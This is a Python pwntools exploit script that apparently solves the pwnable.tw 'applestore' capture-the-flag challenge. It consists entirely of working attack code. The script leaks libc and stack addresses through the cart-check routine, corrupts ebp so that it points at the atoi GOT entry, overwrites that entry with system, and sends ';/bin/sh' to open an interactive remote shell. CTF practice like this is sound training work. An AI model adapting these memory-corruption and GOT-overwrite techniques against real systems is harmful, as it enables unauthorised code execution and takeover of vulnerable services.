#!/usr/bin/env python3

import pwn
io = pwn.remote('chall.pwnable.tw', 10104)
elf = pwn.ELF('./applestore')
libc = pwn.ELF('./libc.so.6')

io.recvuntil('> ') # menu

def overwrite(payload):
	io.sendline('3')
	io.recvuntil('Item Number> ')
	io.sendline(payload)
	io.recvuntil('> ')

def leak(addr):
	payload = b'y ' + pwn.p32(addr) + b'A' * 4 + pwn.p32(0x8049f08)
	io.sendline('4')
	io.recvuntil('Let me check your cart. ok? (y/n) > ')
	io.send(payload)
	io.recvuntil('27: ')
	data = pwn.u32(io.recv(4))
	io.recvuntil('> ')
	return data

for _ in range(6):
	io.sendline('2')
	io.recvuntil('Device Number> ')
	io.sendline('1')
	io.recvuntil('> ')
	
for _ in range(20):
	io.sendline('2')
	io.recvuntil('Device Number> ')
	io.sendline('2')
	io.recvuntil('> ')
	
io.sendline('5')
io.recvuntil('Let me check your cart. ok? (y/n) > ')
io.sendline('y')
io.recvuntil('> ')

# leak libc
printf_got = elf.got[b'printf']
printf_libc = leak(printf_got)

# leak stack address
libc_base = printf_libc - libc.sym[b'printf']
environ = libc_base + libc.sym[b'environ']
stack_leak = leak(environ)

# make ebp points to got entry of atoi - 0x22
offset = 268
ebp_stack = stack_leak - offset
atoi_write = elf.got[b'atoi'] + 0x22
payload = b'27' + pwn.p32(stack_leak) + b'A' * 4 + pwn.p32(atoi_write) + pwn.p32(ebp_stack)
overwrite(payload)

# overwrite got entry of atoi
system_libc = libc_base + libc.sym[b'system']
payload = pwn.p32(system_libc) + b';/bin/sh'
io.sendline(payload)

io.interactive()
